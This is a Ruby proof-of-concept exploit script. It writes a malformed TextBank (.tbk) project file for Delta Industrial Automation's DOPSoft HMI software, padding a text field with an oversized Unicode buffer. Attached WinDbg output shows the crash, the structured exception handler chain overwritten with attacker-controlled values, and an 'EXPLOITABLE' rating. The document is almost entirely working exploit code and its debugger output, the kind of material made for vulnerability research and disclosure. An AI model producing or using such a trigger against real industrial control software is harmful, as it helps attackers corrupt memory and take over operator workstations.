#!/usr/bin/env ruby
# DELTA_IA-HMI_DOPSoft-2-00-07-04_SW_TC-SC-EN-SP_20171214.zip
require 'rex'

msg = Rex::Text.to_unicode("A" * 324) + "\x00" * 2 + "\r\n"

data =  "[TextBank]\r\n"
data << "wFont001=Arial\r\n"
data << "wTextLen001-000=#{msg.size} - 2\r\n"
data << msg

fd = File.new("lalo.tbk","wb")
fd.write(data)
fd.close
__END__
Breakpoint 0 hit
eax=00000000 ebx=00000001 ecx=00410041 edx=8d5201c2 esi=00c8c230 edi=0019f1a2
eip=008a7b00 esp=0019ef60 ebp=0019f1c8 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
DOPSoft+0x4a7b00:
008a7b00 8b4508          mov     eax,dword ptr [ebp+8] ss:002b:0019f1d0=00410041
0:000> kv
 # ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0019f1c8 00410041 00410041 00410041 00410041 DOPSoft+0x4a7b00
01 0019f23c 77245557 77987d30 00000000 0000000d DOPSoft+0x10041
02 0019f274 00000000 7693f145 00000100 fffffff4 USER32!CallWindowProcAorW+0x7f (FPO: [Non-Fpo])
0:000> t
eax=00410041 ebx=00000001 ecx=00410041 edx=8d5201c2 esi=00c8c230 edi=0019f1a2
eip=008a7b03 esp=0019ef60 ebp=0019f1c8 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
DOPSoft+0x4a7b03:
008a7b03 8910            mov     dword ptr [eax],edx  ds:002b:00410041=8d5201c2
0:000> t
(116c.134c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00410041 ebx=00000001 ecx=00410041 edx=8d5201c2 esi=00c8c230 edi=0019f1a2
eip=008a7b03 esp=0019ef60 ebp=0019f1c8 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210282
DOPSoft+0x4a7b03:
008a7b03 8910            mov     dword ptr [eax],edx  ds:002b:00410041=8d5201c2
0:000> kv
 # ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0019f1c8 00410041 00410041 00410041 00410041 DOPSoft+0x4a7b03
01 0019f23c 77245557 77987d30 00000000 0000000d DOPSoft+0x10041
02 0019f274 00000000 7693f145 00000100 fffffff4 USER32!CallWindowProcAorW+0x7f (FPO: [Non-Fpo])
0:000> !exchain
0019f1bc: DOPSoft+10041 (00410041)
Invalid exception stack at 00410041
0:000> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at DOPSoft+0x00000000004a7b03 (Hash=0xd139ac32.0xb489cc4b)

Corruption of the exception handler chain is considered exploitable

